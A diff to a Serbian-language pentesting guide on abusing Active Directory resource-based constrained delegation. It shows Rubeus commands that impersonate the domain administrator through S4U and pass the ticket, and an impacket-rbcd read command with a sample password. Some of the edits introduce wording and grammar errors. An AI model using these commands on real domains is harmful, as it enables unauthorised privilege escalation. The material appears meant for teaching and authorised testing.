@@ -16,7 +16,7 @@ Još jedna važna razlika između ovog Constrained Delegation i drugih delegacij
 U Constrained Delegation je rečeno da je **`TrustedToAuthForDelegation`** oznaka unutar _userAccountControl_ vrednosti korisnika potrebna za izvođenje **S4U2Self.** Ali to nije potpuno tačno.\
 Stvarnost je da čak i bez te vrednosti, možete izvesti **S4U2Self** protiv bilo kog korisnika ako ste **usluga** (imate SPN) ali, ako imate **`TrustedToAuthForDelegation`** vraćeni TGS će biti **Forwardable** i ako **nemate** tu oznaku vraćeni TGS **neće** biti **Forwardable**.
 
-Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NISU Forwardable** pokušaj zloupotrebe **osnovne Constrained Delegation** **neće raditi**. Ali ako pokušavate da iskoristite **Resource-Based constrained delegation, to će raditi**.
+Međutim, ako je **TGS** korišćen u **S4U2Proxy** **NISU Forwardable** pokušaj zloupotrebe **osnovne Constrain Delegation** **neće raditi**. Ali ako pokušavate da iskoristite **Resource-Based constrain delegation, to će raditi**.
 
 ### Struktura napada
 
@@ -76,7 +76,7 @@ Prvo, kreirali smo novi objekat Računar sa lozinkom `123456`, tako da nam je po
 ```bash
 .\Rubeus.exe hash /password:123456 /user:FAKECOMPUTER$ /domain:domain.local
 ```
-Ovo će ispisati RC4 i AES heš vrednosti za taj nalog.\
+Ovo će ispisati RC4 i AES hešove za taj nalog.\
 Sada se napad može izvršiti:
 ```bash
 rubeus.exe s4u /user:FAKECOMPUTER$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /domain:domain.local /ptt
@@ -143,7 +143,7 @@ try { $name = $sid.Translate([System.Security.Principal.NTAccount]) } catch { $n
 }
 }
 ```
-Impacket (čitati ili isprazniti jednim komandom):
+Impacket (čitati ili isprazniti jednim komandama):
 ```bash
 # Read who can delegate to VICTIM
 impacket-rbcd -delegate-to 'VICTIM$' -action read 'domain.local/jdoe:Summer2025!'
